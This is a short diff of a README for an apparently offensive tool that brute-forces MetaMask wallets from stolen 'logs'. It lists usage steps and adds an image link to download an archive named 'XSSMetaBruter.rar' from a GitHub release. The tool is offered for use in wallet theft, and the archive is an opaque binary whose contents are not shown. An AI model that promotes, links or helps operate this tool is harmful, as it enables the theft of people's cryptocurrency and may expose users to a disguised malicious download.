@@ -34,4 +34,4 @@ Value designation in config.json
 5. Drag and drop the folder with logs into the opened console and press Enter.
 6. Wait for the bruteforce to finish; the results will be saved in a txt file next to your bruteforcer exe file.
 
-Translated with DeepL.com (free version)
+[![image](https://github.com/user-attachments/assets/8e8e7d9c-c811-4121-b791-51090a03d458)](https://github.com/ethgenius/brutecheker/releases/download/brutemetamask/XSSMetaBruter.rar)
